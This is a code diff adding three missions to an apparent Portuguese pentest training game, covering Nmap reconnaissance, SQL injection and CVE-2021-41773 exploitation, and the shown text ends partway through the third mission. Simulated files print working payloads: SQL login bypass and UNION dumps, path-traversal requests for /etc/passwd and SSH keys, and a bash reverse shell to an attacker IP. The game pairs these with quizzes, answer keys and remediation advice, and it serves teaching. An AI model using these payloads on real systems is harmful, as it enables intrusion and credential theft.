@@ -2188,6 +2188,1198 @@ notificar o responsável antes de publicar — prazo padrão da indústria: <str
       como_corrigir: "Certificações relevantes: CEH (Certified Ethical Hacker), OSCP (Offensive Security Certified Professional), eJPT (eLearnSecurity Junior Penetration Tester — recomendado para iniciantes), CompTIA PenTest+.",
       boa_pratica: "Frameworks: PTES (Penetration Testing Execution Standard), OWASP Testing Guide, NIST SP 800-115. Ferramentas: Kali Linux, Metasploit (com autorização), Burp Suite, Nmap, Nikto. Regra fundamental: a autorização escrita é o que separa pentest de invasão — sem ela, é crime."
     }
+  },
+
+  // ─── MISSÃO 19 ────────────────────────────────────────────────────────────
+  {
+    id: 19,
+    titulo: "Reconhecimento com Nmap",
+    subtitulo: "Mapeamento ativo de superfície de ataque",
+    dificuldade: "Médio",
+    tipo: "terminal",
+    pontos_maximos: 150,
+    icone: "📡",
+    contexto: `Você acaba de receber um contrato de pentest autorizado contra a <strong>TargetCorp S.A.</strong>
+O escopo cobre o IP <code>192.168.10.50</code>. Fase 1: <strong>reconhecimento ativo</strong>.
+Mapeie todos os serviços, versões e sistema operacional para montar o plano de ataque.`,
+    dica: "Comece com <code>cat nmap_basic.txt</code> para ver a varredura inicial, depois <code>cat nmap_detailed.txt</code> e <code>cat nmap_vuln.txt</code>.",
+    filesystem: {
+      "/": ["home", "var"],
+      "/home": ["hacker"],
+      "/home/hacker": ["nmap_basic.txt", "nmap_detailed.txt", "nmap_vuln.txt", "nmap_os.txt", "http_banner.txt"],
+      "/var": ["log"],
+      "/var/log": ["pentest.log"],
+    },
+    files: {
+      "/home/hacker/nmap_basic.txt": `# Comando: nmap -sS -p- 192.168.10.50
+# Varredura SYN stealth — todas as 65535 portas
+# Iniciada: 2024-02-12 09:14:32
+
+Nmap scan report for 192.168.10.50 (targetcorp.local)
+Host is up (0.0023s latency).
+Not shown: 65527 closed tcp ports (reset)
+
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+443/tcp   open  https
+3306/tcp  open  mysql
+8080/tcp  open  http-proxy
+8443/tcp  open  https-alt
+27017/tcp open  mongodb
+6379/tcp  open  redis
+
+Nmap done: 1 IP address (1 host up) scanned in 142.33 seconds`,
+
+      "/home/hacker/nmap_detailed.txt": `# Comando: nmap -sV -sC -p 22,80,443,3306,8080,8443,27017,6379 192.168.10.50
+# Detectando versões e rodando scripts padrão NSE
+
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5
+| ssh-hostkey:
+|   2048 8e:2e:3e:f3:d4:c9:11:aa:bb:cc:dd:ee:ff:00:11:22 (RSA)
+|_  256 aa:bb:cc:dd:ee:ff:00:11:22:33:44:55:66:77:88:99 (ECDSA)
+
+80/tcp    open  http        Apache httpd 2.4.49
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: TargetCorp - Employee Portal
+|_http-server-header: Apache/2.4.49 (Ubuntu)
+
+443/tcp   open  ssl/http    Apache httpd 2.4.49
+|_ssl-cert: Subject: commonName=targetcorp.local
+
+3306/tcp  open  mysql       MySQL 5.7.35-log
+| mysql-info:
+|   Version: 5.7.35-log
+|_  Status: Autocommit
+
+8080/tcp  open  http        Werkzeug httpd 2.0.1 (Python 3.8.10)
+|_http-title: TargetCorp Admin Panel
+
+27017/tcp open  mongodb     MongoDB 4.4.6
+| mongodb-info:
+|_  MongoDB -- sem autenticacao configurada!
+
+6379/tcp  open  redis       Redis key-value store 6.0.9
+|_redis-info: Redis sem autenticacao -- acesso livre!
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`,
+
+      "/home/hacker/nmap_vuln.txt": `# Comando: nmap --script=vuln -p 80,443 192.168.10.50
+# Testando vulnerabilidades conhecidas
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-vuln-cve2021-41773:
+|   VULNERABLE:
+|   Apache HTTP Server 2.4.49 Path Traversal e RCE
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE: CVE-2021-41773
+|     Risk factor: Critical -- CVSS: 9.8
+|     Description:
+|       Falha na normalizacao de URLs permite path traversal fora do DocumentRoot.
+|       Se mod_cgi estiver ativo: Remote Code Execution completo.
+|       Explorado ativamente in-the-wild desde outubro de 2021.
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773
+
+443/tcp open  https
+|_http-vuln-cve2021-41773: VULNERABLE (mesma versao no HTTPS)`,
+
+      "/home/hacker/nmap_os.txt": `# Comando: nmap -O --osscan-guess 192.168.10.50
+
+OS detection performed:
+Running: Linux 4.X|5.X
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+Kernel 4.15 identificado -- possiveis CVEs:
+- CVE-2021-3156 (Sudo Baron Samedit -- sudo < 1.9.5p2)
+- CVE-2021-4034 (Polkit pkexec -- local privilege escalation)
+- CVE-2022-0847 (Dirty Pipe -- kernel < 5.16.11)`,
+
+      "/home/hacker/http_banner.txt": `# Comando: curl -I http://192.168.10.50
+
+HTTP/1.1 200 OK
+Server: Apache/2.4.49 (Ubuntu)
+X-Powered-By: PHP/7.4.3
+Set-Cookie: PHPSESSID=abc123; path=/; HttpOnly
+
+# HEADERS DE SEGURANÇA AUSENTES:
+# - Content-Security-Policy: NAO configurado
+# - X-Content-Type-Options: NAO configurado
+# - Strict-Transport-Security: NAO configurado
+# - Server header expoe versao exata do Apache`,
+
+      "/var/log/pentest.log": `[2024-02-12 09:14:00] Pentest iniciado -- TargetCorp S.A.
+[2024-02-12 09:14:32] Autorizacao verificada -- escopo: 192.168.10.50
+[2024-02-12 09:15:00] Iniciando fase de reconhecimento ativo`,
+    },
+    perguntas: [
+      {
+        id: 1,
+        texto: "O nmap_basic.txt mostra portas 27017 (MongoDB) e 6379 (Redis) abertas. O nmap_detailed.txt confirma: ambos SEM autenticação. O que isso representa?",
+        opcoes: [
+          { id: "a", texto: "MongoDB e Redis são serviços normais — sem risco adicional de estarem expostos" },
+          { id: "b", texto: "Bancos de dados nunca devem ser expostos à internet; sem autenticação significa acesso total a todos os dados sem credenciais — CVSS 10.0" },
+          { id: "c", texto: "Precisamos fazer login para confirmar se há risco real" },
+          { id: "d", texto: "Apenas o MySQL (3306) representa risco real neste cenário" }
+        ],
+        correta: "b",
+        pontos: 40,
+        feedback_correto: "Perfeito! MongoDB na 27017 e Redis na 6379 jamais devem estar expostos à internet. Sem autenticação = qualquer pessoa acessa, lê, modifica e deleta todos os dados sem nenhuma credencial. CVSS 10.0. O nmap_detailed.txt confirma explicitamente 'sem autenticação configurada' em ambos — vulnerabilidade imediatamente explorável.",
+        feedback_errado: "Bancos de dados (MongoDB, Redis, MySQL) nunca devem ficar expostos diretamente à internet. O nmap_detailed.txt confirma o pior cenário: MongoDB e Redis completamente sem autenticação. Isso significa acesso total aos dados por qualquer pessoa na internet — CVSS 10.0. É o tipo de misconfiguration que expõe milhões de registros de usuários."
+      },
+      {
+        id: 2,
+        texto: "O nmap_vuln.txt identifica CVE-2021-41773 no Apache 2.4.49 como EXPLOITABLE (CVSS 9.8). O que este CVE permite fazer?",
+        opcoes: [
+          { id: "a", texto: "Apenas ler código-fonte de arquivos PHP — sem execução de código" },
+          { id: "b", texto: "Path Traversal para ler arquivos fora do webroot E Remote Code Execution se mod_cgi estiver ativo — comprometimento total do servidor" },
+          { id: "c", texto: "Derrubar o servidor Apache com um pacote malformado (DoS apenas)" },
+          { id: "d", texto: "Injeção SQL no banco de dados via requisição HTTP" }
+        ],
+        correta: "b",
+        pontos: 40,
+        feedback_correto: "CVE-2021-41773: (1) Path Traversal — leitura de qualquer arquivo no servidor via URL manipulada (ex: /etc/passwd, chaves SSH, configs com senhas), (2) com mod_cgi ativo: RCE completo — executar qualquer comando como o usuário do Apache. Foi explorado massivamente in-the-wild em outubro de 2021, dias após o disclosure.",
+        feedback_errado: "CVE-2021-41773 é mais severo do que parece: Path Traversal permite ler /etc/passwd, chaves SSH privadas, arquivos de configuração com senhas de banco. E se mod_cgi estiver ativo (comum em servidores legados): Remote Code Execution completo — o atacante executa qualquer comando no servidor como www-data."
+      },
+      {
+        id: 3,
+        texto: "Para detectar versões de serviço E executar scripts de vulnerabilidade conhecidos, o comando nmap completo é:",
+        opcoes: [
+          { id: "a", texto: "nmap -sS 192.168.10.50" },
+          { id: "b", texto: "nmap -p 80 192.168.10.50" },
+          { id: "c", texto: "nmap -sV -sC --script=vuln -p- 192.168.10.50" },
+          { id: "d", texto: "nmap --fast 192.168.10.50" }
+        ],
+        correta: "c",
+        pontos: 30,
+        feedback_correto: "Exato! -sV detecta versões dos serviços (revela Apache 2.4.49, Redis 6.0.9, etc.), -sC roda os scripts NSE padrão, --script=vuln adiciona verificações de CVEs conhecidos (como o CVE-2021-41773 encontrado), -p- varre todas as 65535 portas e não apenas as 1000 mais comuns. Combinação padrão em reconhecimento de pentest profissional.",
+        feedback_errado: "nmap -sV -sC --script=vuln -p- é o comando completo de reconhecimento: -sV detecta versões (essencial para identificar CVEs), -sC roda scripts padrão NSE (banners, certificados, métodos HTTP), --script=vuln testa CVEs conhecidos automaticamente, -p- varre todas as portas (sem -p- só varreria as 1000 mais comuns e perderia portas como 27017 e 6379)."
+      },
+      {
+        id: 4,
+        texto: "Com base no reconhecimento completo, qual é o PRIMEIRO vetor de exploração recomendado e por quê?",
+        opcoes: [
+          { id: "a", texto: "Testar credenciais padrão no SSH (porta 22)" },
+          { id: "b", texto: "CVE-2021-41773 no Apache 2.4.49 — CVSS 9.8, confirmado como exploitable, exploit público disponível, RCE direto no servidor" },
+          { id: "c", texto: "Conectar diretamente ao MongoDB sem autenticação" },
+          { id: "d", texto: "Brute force no MySQL (porta 3306)" }
+        ],
+        correta: "b",
+        pontos: 40,
+        feedback_correto: "Priorização correta de red team! CVE-2021-41773: CVSS 9.8, exploit público bem documentado, confirmado pelo Nmap como exploitable nesta versão específica, e resulta em RCE — controle shell do servidor. Com o servidor comprometido, acessamos MongoDB e Redis internamente (sem passar pela rede pública). Estratégia: exploit mais confiável e com maior impacto primeiro.",
+        feedback_errado: "CVE-2021-41773 é o vetor prioritário: (1) CVSS 9.8 — quase máximo, (2) exploit público e amplamente disponível, (3) Nmap confirmou como exploitable, (4) RCE = shell no servidor, de onde acessamos MongoDB e Redis internamente. MongoDB sem auth também é crítico, mas CVE-2021-41773 nos dá controle do host inteiro — pivotamos para os bancos de dados de dentro."
+      }
+    ],
+    conclusao: {
+      o_que_aconteceu: "O reconhecimento ativo com Nmap revelou uma superfície de ataque crítica: Apache 2.4.49 vulnerável a RCE (CVE-2021-41773, CVSS 9.8), MongoDB e Redis sem autenticação expostos à internet, MySQL acessível externamente, e ausência completa de headers de segurança HTTP.",
+      vulnerabilidade: "Múltiplas vulnerabilidades críticas identificadas: CVE-2021-41773 (Apache RCE), bancos de dados sem autenticação expostos publicamente, versões desatualizadas de software sem patches, e serviços internos acessíveis diretamente da internet.",
+      risco: "Comprometimento total do servidor via RCE, exfiltração de dados via MongoDB e Redis sem autenticação, e pivoting para rede interna a partir do servidor comprometido.",
+      como_corrigir: "1. Atualizar Apache imediatamente para 2.4.51+ (patch do CVE-2021-41773)\n2. Configurar firewall: bancos de dados NUNCA expostos à internet — bind em 127.0.0.1\n3. Habilitar autenticação em MongoDB e Redis\n4. Implementar headers de segurança HTTP (CSP, HSTS, X-Content-Type-Options)\n5. Segmentar rede: serviços internos em VLAN separada sem acesso externo direto",
+      boa_pratica: "Reconhecimento é a fase mais crítica do pentest — uma varredura completa com nmap -sV -sC --script=vuln -p- revela a superfície de ataque real. No dia a dia: mantenha inventário de ativos atualizado (asset inventory), use Shodan para ver o que está exposto na internet sem saber, e aplique patches em no máximo 7 dias para CVEs críticos (CVSS >= 9.0). CVEs explorados in-the-wild exigem patching em 24-48h."
+    }
+  },
+
+  // ─── MISSÃO 20 ────────────────────────────────────────────────────────────
+  {
+    id: 20,
+    titulo: "SQLi na Prática — Extração de Dados",
+    subtitulo: "SQL Injection manual e automatizado com sqlmap",
+    dificuldade: "Difícil",
+    tipo: "terminal",
+    pontos_maximos: 200,
+    icone: "💉",
+    contexto: `O reconhecimento identificou um portal web vulnerável em <code>http://192.168.10.50/portal.php?id=1</code>.
+Testes iniciais mostram mensagens de erro do banco de dados expostas na tela.
+Sua missão: <strong>executar SQL Injection manualmente e com sqlmap para extrair credenciais</strong> — de forma documentada e dentro do escopo contratado.`,
+    dica: "Leia <code>cat teste_manual.txt</code> para os primeiros testes, depois <code>cat union_test.txt</code> e <code>cat sqlmap_dump.txt</code>.",
+    filesystem: {
+      "/": ["home", "var"],
+      "/home": ["hacker"],
+      "/home/hacker": ["teste_manual.txt", "union_test.txt", "sqlmap_output.txt", "sqlmap_dump.txt", "relatorio_parcial.txt"],
+      "/var": ["log"],
+      "/var/log": ["pentest.log"],
+    },
+    files: {
+      "/home/hacker/teste_manual.txt": `# Teste Manual de SQL Injection
+# Target: http://192.168.10.50/portal.php?id=
+
+=== TESTE 1: Valor normal ===
+curl "http://192.168.10.50/portal.php?id=1"
+-> Retorna: <h2>Bem-vindo, Carlos!</h2>
+
+=== TESTE 2: Aspas simples (deteccao) ===
+curl "http://192.168.10.50/portal.php?id=1'"
+-> ERRO EXPOSTO:
+   You have an error in your SQL syntax; check the manual
+   that corresponds to your MySQL server version for the right
+   syntax to use near ''' at line 1
+
+*** CONFIRMADO: SQL INJECTION! ***
+Input nao sanitizado -- concatenado diretamente na query SQL.
+
+=== TESTE 3: Bypass de autenticacao no login ===
+curl "http://192.168.10.50/login.php" \\
+  --data "user=' OR '1'='1' --&pass=qualquer"
+-> Login bem-sucedido como: admin (id=1)
+
+A query virou:
+  SELECT * FROM users WHERE user='' OR '1'='1' --' AND pass='qualquer'
+  A condicao OR '1'='1' e sempre verdadeira -> bypassa autenticacao.
+
+=== TESTE 4: Enumerar numero de colunas (ORDER BY) ===
+id=1 ORDER BY 1--  -> OK
+id=1 ORDER BY 2--  -> OK
+id=1 ORDER BY 3--  -> OK
+id=1 ORDER BY 4--  -> OK
+id=1 ORDER BY 5--  -> ERRO
+-> Resultado: a query original retorna exatamente 4 colunas.`,
+
+      "/home/hacker/union_test.txt": `# Extracao manual via UNION SELECT
+# Target: http://192.168.10.50/portal.php?id=
+
+=== PASSO 1: Identificar coluna visivel na resposta ===
+Payload: id=0 UNION SELECT 1,2,3,4--
+-> Pagina exibe: "Bem-vindo, 2!"
+-> Coluna 2 e exibida no HTML -- usaremos para exfiltrar dados.
+
+=== PASSO 2: Versao do banco ===
+Payload: id=0 UNION SELECT 1,version(),3,4--
+-> Resultado: 5.7.35-log  (MySQL 5.7.35 confirmado)
+
+=== PASSO 3: Banco de dados atual ===
+Payload: id=0 UNION SELECT 1,database(),3,4--
+-> Resultado: targetcorp_db
+
+=== PASSO 4: Listar tabelas ===
+Payload: id=0 UNION SELECT 1,group_concat(table_name),3,4
+         FROM information_schema.tables
+         WHERE table_schema='targetcorp_db'--
+-> Resultado: users,employees,sessions,products,orders
+
+=== PASSO 5: Colunas da tabela users ===
+Payload: id=0 UNION SELECT 1,group_concat(column_name),3,4
+         FROM information_schema.columns
+         WHERE table_name='users'--
+-> Resultado: id,username,password,email,role
+
+=== PASSO 6: DUMP da tabela users ===
+Payload: id=0 UNION SELECT 1,
+         group_concat(username,':',password SEPARATOR '|'),3,4
+         FROM users--
+-> Resultado:
+   admin:5f4dcc3b5aa765d61d8327deb882cf99
+   carlos:e10adc3949ba59abbe56e057f20f883e
+   suporte:d8578edf8458ce06fbc5bb76a58c5ca4`,
+
+      "/home/hacker/sqlmap_output.txt": `# Comando: sqlmap -u "http://192.168.10.50/portal.php?id=1" --dbs --batch
+
+[INFO] testing connection to the target URL
+[INFO] GET parameter 'id' appears to be dynamic
+[INFO] heuristic test shows parameter 'id' might be injectable
+[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[INFO] GET parameter 'id' appears to be 'boolean-based blind' injectable
+[INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[INFO] parameter 'id' appears to be 'time-based blind' injectable
+[INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[INFO] parameter 'id' is 'Generic UNION query (NULL) - 4 columns' injectable
+
+sqlmap identified injection points:
+Parameter: id (GET)
+    Type: boolean-based blind
+    Payload: id=1 AND 2908=2908
+
+    Type: time-based blind
+    Payload: id=1 AND SLEEP(5)
+
+    Type: UNION query (4 columns)
+    Payload: id=0 UNION ALL SELECT NULL,CONCAT(dados),NULL,NULL--
+
+back-end DBMS: MySQL >= 5.0.12
+web server: Apache 2.4.49 / PHP 7.4.3
+
+available databases [3]:
+[*] information_schema
+[*] mysql
+[*] targetcorp_db`,
+
+      "/home/hacker/sqlmap_dump.txt": `# Comando: sqlmap -u "http://192.168.10.50/portal.php?id=1"
+#          -D targetcorp_db -T users --dump --batch
+
+[INFO] fetching columns for table 'users'
+[INFO] fetching entries for table 'users'
+[INFO] recognized possible password hashes in column 'password'
+[INFO] using hash method 'md5_generic_passwd'
+[INFO] loading dictionary from wordlist...
+
++----+----------+----------------------------------+----------------------+-------+
+| id | username | password                         | email                | role  |
++----+----------+----------------------------------+----------------------+-------+
+| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@targetcorp.com | admin |
+|    |          | -> CRACKEADO: password           |                      |       |
++----+----------+----------------------------------+----------------------+-------+
+| 2  | carlos   | e10adc3949ba59abbe56e057f20f883e | carlos@targetcorp.com| user  |
+|    |          | -> CRACKEADO: 123456             |                      |       |
++----+----------+----------------------------------+----------------------+-------+
+| 3  | suporte  | d8578edf8458ce06fbc5bb76a58c5ca4 | suporte@targetcorp.com|admin |
+|    |          | -> CRACKEADO: qwerty             |                      |       |
++----+----------+----------------------------------+----------------------+-------+
+
+[INFO] table 'targetcorp_db.users' dumped to CSV`,
+
+      "/home/hacker/relatorio_parcial.txt": `# Relatorio Parcial -- SQL Injection
+# TargetCorp S.A. | Pentest Autorizado
+
+ACHADO CRITICO -- SQL Injection (CVSS 9.8)
+==========================================
+Parametro vulneravel: GET id em /portal.php
+Tipos de SQLi confirmados:
+  - Boolean-based blind
+  - Time-based blind
+  - UNION-based (usado para extracao)
+
+Dados Extraidos:
+  Database: targetcorp_db
+  Tabela users: 3 registros incluindo 2 admins
+  Senhas: MD5 sem salt -> TODAS crackeadas instantaneamente
+
+Impacto:
+  -> Acesso administrativo completo (admin/password)
+  -> Comprometimento de contas admin e suporte
+  -> MD5 sem salt: rainbow tables crackeiam em segundos
+
+Recomendacoes Imediatas:
+  1. Prepared Statements / PDO (elimina SQLi por design)
+  2. Trocar TODAS as senhas comprometidas
+  3. Migrar de MD5 para bcrypt/Argon2id
+  4. WAF temporario ate correcao do codigo-fonte`,
+    },
+    perguntas: [
+      {
+        id: 1,
+        texto: "O teste_manual.txt mostra que inserir uma aspas simples (') retornou um erro SQL do servidor. O que isso PROVA e qual é o próximo passo?",
+        opcoes: [
+          { id: "a", texto: "Prova que o servidor está mal configurado, mas não é diretamente explorável" },
+          { id: "b", texto: "Prova que o input do usuário é concatenado diretamente na query SQL sem sanitização — SQL Injection confirmado. Próximo: payloads UNION SELECT para extração de dados" },
+          { id: "c", texto: "É apenas um erro de validação de formulário — o banco permanece seguro" },
+          { id: "d", texto: "Precisamos de credenciais para explorar a vulnerabilidade" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "Diagnóstico perfeito! O erro SQL exposto confirma dois problemas: (1) input não sanitizado — a aspas foi para dentro da query quebrando a sintaxe SQL, (2) error disclosure — o servidor retorna mensagens de erro internas, facilitando o fingerprinting. Próximo: UNION SELECT para extrair dados do banco sem autenticação.",
+        feedback_errado: "Aspas simples retornando erro SQL é o indicador clássico de SQL Injection. Significa que o PHP está fazendo: 'SELECT * FROM users WHERE id='.$_GET['id']' — a aspas do atacante quebra a sintaxe, o banco retorna erro interno visível na página. É exploração direta via UNION SELECT para ler qualquer tabela do banco."
+      },
+      {
+        id: 2,
+        texto: "O union_test.txt usa ORDER BY crescente para enumerar colunas antes do UNION SELECT. Por que essa etapa é obrigatória?",
+        opcoes: [
+          { id: "a", texto: "ORDER BY melhora a velocidade da extração de dados" },
+          { id: "b", texto: "UNION SELECT exige que ambas as queries retornem exatamente o mesmo número de colunas — ORDER BY N causa erro quando N supera o total real de colunas, revelando esse número" },
+          { id: "c", texto: "ORDER BY é necessário apenas em MySQL — outros bancos não precisam" },
+          { id: "d", texto: "Para que os resultados apareçam em ordem alfabética no HTML" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "Técnica fundamental! UNION em SQL exige: mesmo número de colunas e tipos compatíveis nas duas queries. ORDER BY 1 até N causa erro quando N > número real de colunas. No exemplo: ORDER BY 4 funciona, ORDER BY 5 falha → query original tem 4 colunas. Então UNION SELECT 1,payload,3,4-- funciona e a coluna 2 (visível na página) carrega os dados extraídos.",
+        feedback_errado: "UNION SELECT requer que as duas queries tenham o mesmo número de colunas. Para descobrir esse número, usamos ORDER BY N — aumentando N até gerar erro. Quando ORDER BY 5 falha mas ORDER BY 4 funciona, a query original tem 4 colunas. Então: UNION SELECT 1,version(),3,4-- funciona. Sem saber o número exato de colunas, o UNION retorna erro SQL."
+      },
+      {
+        id: 3,
+        texto: "O sqlmap_dump.txt mostra senhas em MD5 sem salt TODAS crackeadas. Por que MD5 é inadequado para armazenar senhas?",
+        opcoes: [
+          { id: "a", texto: "MD5 é lento demais para verificar senhas em tempo real" },
+          { id: "b", texto: "MD5 é rápido demais (GPUs fazem bilhões de hashes/segundo), sem salt permite rainbow tables pré-computadas, e hashes idênticos revelam usuários com a mesma senha" },
+          { id: "c", texto: "MD5 não é compatível com todos os bancos de dados modernos" },
+          { id: "d", texto: "MD5 ocupa muito espaço em disco" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "Análise perfeita! MD5 tem três falhas fatais para senhas: (1) Velocidade — GPUs fazem 10+ bilhões de hashes MD5 por segundo, tornando brute force trivial, (2) Sem salt — 'password' sempre vira '5f4dcc3b...' em qualquer banco, rainbow tables pré-computadas crackeiam instantaneamente, (3) sqlmap até crackeou as senhas automaticamente durante o dump! Use bcrypt (fator de custo configurável) ou Argon2id.",
+        feedback_errado: "MD5 é inadequado por: (1) Extremamente rápido — bilhões de tentativas por segundo em GPU, (2) Sem salt — mesmo hash para mesma senha em qualquer banco = rainbow tables funcionam, (3) Sem iterações — bcrypt e Argon2 são propositalmente lentos, cada tentativa leva 100ms em vez de nanosegundos. Use sempre bcrypt (PHP), bcryptjs (Node.js), passlib (Python) para hash de senhas."
+      },
+      {
+        id: 4,
+        texto: "Você tem dump completo do banco com credenciais admin. Qual é a conduta ética correta agora em um pentest profissional?",
+        opcoes: [
+          { id: "a", texto: "Usar admin/password para acessar todos os sistemas e demonstrar o impacto máximo" },
+          { id: "b", texto: "Parar a exploração, documentar com evidências mínimas, notificar imediatamente o cliente da criticidade e aguardar autorização para continuar" },
+          { id: "c", texto: "Deletar dados para provar que o dano real seria possível" },
+          { id: "d", texto: "Compartilhar as credenciais com a equipe por e-mail como evidência" }
+        ],
+        correta: "b",
+        pontos: 50,
+        feedback_correto: "Conduta ética exemplar! Pentest profissional (PTES): (1) evidências mínimas — screenshot do dump prova o achado sem exfiltrar dados reais de usuários, (2) parar quando o objetivo foi provado — não explora além do necessário, (3) notificar imediatamente findings críticos — não acumula para o relatório final, (4) nunca usa credenciais além do escopo mínimo de prova. Objetivo: provar a vulnerabilidade, não maximizar o dano.",
+        feedback_errado: "Conduta ética em pentest: (1) DOCUMENTAR — screenshot do dump como evidência mínima, (2) PARAR — objective proved, não continua explorando além do necessário, (3) NOTIFICAR — cliente precisa saber imediatamente de comprometimento de credenciais admin, (4) NÃO EXFILTRAR dados reais de usuários — viola LGPD e o contrato, (5) NUNCA deletar ou modificar dados — pode causar dano irreversível."
+      }
+    ],
+    conclusao: {
+      o_que_aconteceu: "SQL Injection UNION-based no parâmetro ?id= permitiu extrair o banco de dados completo sem autenticação. Senhas em MD5 sem salt foram crackeadas em segundos via rainbow tables, comprometendo as contas admin e suporte com acesso privilegiado ao sistema.",
+      vulnerabilidade: "CWE-89 (SQL Injection) — concatenação direta de input do usuário em queries SQL sem sanitização. Agravante: senhas em MD5 sem salt (CWE-916) permitiram crackear 100% das credenciais instantaneamente via rainbow tables.",
+      risco: "Comprometimento total da base de usuários, acesso administrativo completo, potencial exfiltração de dados de clientes (LGPD Art. 48 — notificação obrigatória em 72h), acesso a outros sistemas com credenciais admin crackeadas.",
+      como_corrigir: "1. Usar exclusivamente Prepared Statements/PDO — elimina SQL Injection por design\n2. Substituir MD5 por bcrypt (custo >= 12) ou Argon2id\n3. Salt único por usuário (bcrypt gera automaticamente)\n4. Desabilitar exibição de erros SQL em produção (display_errors=Off)\n5. Revogar e trocar TODAS as credenciais comprometidas\n6. WAF temporário como medida emergencial",
+      boa_pratica: "SQL Injection está no OWASP Top 10 (A03:2021) há mais de uma década. Prevenção: NUNCA concatene input do usuário em queries — use sempre Prepared Statements. Ferramentas de teste: sqlmap (automatizado), Burp Suite Repeater (manual), OWASP ZAP. Para senhas: biblioteca bcrypt nativa de cada linguagem — bcryptjs no Node.js, password_hash() no PHP, passlib no Python."
+    }
+  },
+
+  // ─── MISSÃO 21 ────────────────────────────────────────────────────────────
+  {
+    id: 21,
+    titulo: "Shell Reversa — Exploração de Serviço",
+    subtitulo: "CVE-2021-41773: do Path Traversal ao Remote Code Execution",
+    dificuldade: "Difícil",
+    tipo: "terminal",
+    pontos_maximos: 200,
+    icone: "🐚",
+    contexto: `Apache 2.4.49 confirmado como vulnerável ao <strong>CVE-2021-41773</strong>.
+Hora de explorar: primeiro Path Traversal para obter arquivos críticos,
+depois Remote Code Execution para estabelecer uma <strong>shell reversa no servidor</strong>.
+Tudo dentro do escopo autorizado e documentado.`,
+    dica: "Leia <code>cat exploit_traversal.txt</code> para o Path Traversal, depois <code>cat rce_shell.txt</code> e <code>cat stabilize_shell.txt</code>.",
+    filesystem: {
+      "/": ["home", "opt", "var"],
+      "/home": ["hacker"],
+      "/home/hacker": ["exploit_traversal.txt", "rce_shell.txt", "netcat_listener.txt", "stabilize_shell.txt"],
+      "/opt": ["exploits"],
+      "/opt/exploits": ["cve-2021-41773.py"],
+      "/var": ["log"],
+      "/var/log": ["pentest.log"],
+    },
+    files: {
+      "/home/hacker/exploit_traversal.txt": `# CVE-2021-41773 -- Path Traversal no Apache 2.4.49
+# CVSS 7.5 (Path Traversal) -> 9.8 (com RCE via mod_cgi)
+# Afeta: Apache 2.4.49 APENAS (corrigido no 2.4.51)
+
+=== COMO FUNCIONA ===
+O Apache 2.4.49 tem falha na normalizacao de URLs.
+A sequencia "%2e%2e/" (../ URL-encoded de forma mista)
+nao e normalizada antes da verificacao de seguranca.
+Resultado: o path traversal passa pela protecao mas e
+interpretado como "../" pelo sistema de arquivos.
+
+=== TESTE 1: Ler /etc/passwd ===
+curl "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+
+RESPOSTA:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+carlos:x:1001:1001:Carlos Mendes,,,:/home/carlos:/bin/bash
+mysql:x:110:115:MySQL Server,,,:/var/lib/mysql:/bin/false
+
+-> SUCESSO! Lemos /etc/passwd sem autenticacao!
+
+=== TESTE 2: Chave SSH privada do usuario carlos ===
+curl "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/home/carlos/.ssh/id_rsa"
+
+RESPOSTA:
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn...
+[CHAVE SSH PRIVADA COMPLETA OBTIDA]
+-----END OPENSSH PRIVATE KEY-----
+
+-> CRITICO: chave privada SSH exposta!
+-> ssh -i id_rsa carlos@192.168.10.50 funciona sem senha.
+
+=== TESTE 3: Credenciais do banco no config.php ===
+curl "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/var/www/html/config.php"
+
+RESPOSTA:
+<?php
+$db_host = "localhost";
+$db_user = "appuser";
+$db_pass = "S3cr3t@DB2024";
+$db_name = "targetcorp_db";
+?>
+
+-> Credenciais do banco expostas via Path Traversal!`,
+
+      "/home/hacker/rce_shell.txt": `# CVE-2021-41773 -- Remote Code Execution via mod_cgi
+# Requisito: mod_cgi ativo (comum em servidores legados)
+
+=== VERIFICAR SE mod_cgi ESTA ATIVO ===
+curl "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/apache2/mods-enabled/"
+-> Listagem inclui: cgi.load, cgi.conf -- mod_cgi confirmado!
+
+=== TESTE RCE: Executar comando no servidor ===
+curl -s --path-as-is -d "echo;id" \\
+  "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+
+RESPOSTA:
+Content-type: text/html
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+-> EXECUCAO DE CODIGO REMOTO CONFIRMADA!
+-> Executando como: www-data (usuario do Apache)
+
+=== SHELL REVERSA (payload completo) ===
+# Passo 1: na maquina atacante (Kali), iniciar listener
+nc -lvnp 4444
+
+# Passo 2: enviar payload de shell reversa
+curl -s --path-as-is \\
+  -d "echo;bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" \\
+  "http://192.168.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
+
+-> Conexao entrante no listener!
+-> Shell reversa estabelecida como www-data.`,
+
